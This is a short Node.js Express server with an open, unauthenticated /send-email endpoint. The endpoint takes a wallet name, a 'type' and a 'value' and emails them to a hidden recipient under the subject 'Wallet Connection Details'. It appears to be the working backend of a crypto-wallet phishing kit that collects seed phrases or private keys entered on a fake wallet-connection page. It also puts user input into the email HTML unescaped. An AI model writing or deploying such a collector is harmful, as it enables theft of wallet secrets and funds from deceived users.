const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 5000;

app.use(cors());
app.use(bodyParser.json());

// Configure Nodemailer Transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// Email Sending Endpoint
app.post('/send-email', (req, res) => {
  const { wallet, type, value } = req.body;

  if (!wallet || !type || !value) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  const mailOptions = {
    from: process.env.EMAIL_USER, 
    to: process.env.RECIPIENT_EMAIL, 
    subject: 'Wallet Connection Details',
    text: `Wallet: ${wallet.name}\nType: ${type}\nValue: ${value}`, 
    html: `<h3>Wallet: ${wallet.name}</h3><p>Type: ${type}</p><p>Value: ${value}</p>`,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      return res.status(500).json({ error: 'Failed to send email' });
    }

    console.log('Email sent: ' + info.response);
    return res.status(200).json({ message: 'Email sent successfully' });
  });
});

// Start Server
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
